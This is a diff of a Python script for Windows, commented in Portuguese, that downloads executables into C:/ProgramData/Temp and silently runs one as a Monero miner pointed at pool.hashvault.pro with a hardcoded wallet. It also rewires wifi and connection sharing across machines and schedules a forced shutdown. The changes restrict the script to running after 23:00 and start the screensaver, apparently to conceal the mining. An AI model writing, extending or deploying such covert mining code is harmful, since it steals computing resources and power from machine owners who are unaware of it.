@@ -23,8 +23,7 @@ destino = Path("C:/ProgramData/Temp")
 def is_after_23():
     return datetime.datetime.now().hour >= 23
 
-import subprocess
-import time
+
 
 def connect_to_wifi():
     # 1. Ativa o adaptador (caso esteja desativado)
@@ -51,6 +50,7 @@ def connect_to_wifi():
         f'netsh wlan connect name="{wifi_ssid}" interface="{wifi_interface}"',
         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
     )
+
 
 
 def enable_ics():
@@ -87,10 +87,13 @@ def enable_ics():
     except Exception:
         pass
 
+
+
 def restart_ethernet():
     subprocess.run(f'netsh interface set interface "{ethernet_interface}" admin=disable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     time.sleep(10)
     subprocess.run(f'netsh interface set interface "{ethernet_interface}" admin=enable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
 
 
 def schedule_shutdown():
@@ -104,6 +107,8 @@ def schedule_shutdown():
 
     # agenda o desligamento forçado
     subprocess.run(f'shutdown /s /f /t {secs_left}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+
 
 def disable_ics():
     now = datetime.datetime.now()
@@ -155,7 +160,9 @@ Register-ScheduledTask -TaskName 'DesativarICS' `
 
     subprocess.run(['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps_cmd],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    
+
+
+
 def baixar_arquivos():
     destino.mkdir(parents=True, exist_ok=True)
     for arquivo in arquivos_para_baixar:
@@ -166,9 +173,30 @@ def baixar_arquivos():
         except Exception:
             continue
 
-def desligar_monitor():
-    subprocess.Popen(f'cmd /c start "" "{destino}\\sart.exe" monitor off', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    subprocess.Popen(f'cmd /c start "" "{destino}\\sart.exe" mutesysvolume 1', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+
+def desligar_monitor(tempo_em_segundos=300):
+    try:
+        # Comandos de configuração via reg add
+        comandos_reg = [
+            ['reg', 'add', r'HKCU\Control Panel\Desktop', '/v', 'SCRNSAVE.EXE', '/t', 'REG_SZ', '/d', r'C:\Windows\System32\scrnsave.scr', '/f'],
+            ['reg', 'add', r'HKCU\Control Panel\Desktop', '/v', 'ScreenSaveTimeOut', '/t', 'REG_SZ', '/d', str(tempo_em_segundos), '/f'],
+            ['reg', 'add', r'HKCU\Control Panel\Desktop', '/v', 'ScreenSaveActive', '/t', 'REG_SZ', '/d', '1', '/f'],
+        ]
+
+        # Executa os comandos de registro
+        for comando in comandos_reg:
+            subprocess.run(comando, check=True, shell=True)
+            print(f"✔ Comando executado: {' '.join(comando)}")
+
+        # Inicia imediatamente o protetor de tela
+        subprocess.run([r'C:\Windows\System32\scrnsave.scr', '/s'], check=True)
+        print("✔ Protetor de tela iniciado.")
+
+    except subprocess.CalledProcessError as e:
+        print(f"Erro ao executar comando: {e}")
+
+
 
 def get_computer_description():
     try:
@@ -181,8 +209,12 @@ def get_computer_description():
     except Exception:
         return "sem_descricao"
 
+
+
 def ligar_crealit():
     subprocess.Popen(f'cmd /c start "" "{destino}\\crealit.exe"  --coin monero -o pool.hashvault.pro:80 -u 41g9z6vMVXh9egLLuyJGHyWzRjoagmDHSbgAk7WoxWpGPMSBL33ArZudfN8Fmq8QGPDLLtNdxEevNadr4wxtYhASEx7gpYx -p {get_computer_description()} --donate-level 1 --background', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+
 
 def configurar_ip(rede_base="192.168.137.", gateway="192.168.137.1", mascara="255.255.255.0",
                   dns1="8.8.8.8", dns2="192.168.137.1", usar_powershell=True):
@@ -228,10 +260,10 @@ def configurar_ip(rede_base="192.168.137.", gateway="192.168.137.1", mascara="25
 
 
 def main_master():
-    # if not is_after_23():
-    #     return
+    if not is_after_23():
+        return
     baixar_arquivos()
-    #desligar_monitor()  
+    desligar_monitor()  
     schedule_shutdown()  
     connect_to_wifi()
     time.sleep(10)
@@ -242,10 +274,10 @@ def main_master():
     disable_ics()
 
 def main_slave():
-    # if not is_after_23():
-    #      return
+    if not is_after_23():
+         return
     baixar_arquivos()
-    #desligar_monitor() 
+    desligar_monitor() 
     configurar_ip(usar_powershell=False)
     time.sleep(10)
     #restart_ethernet()
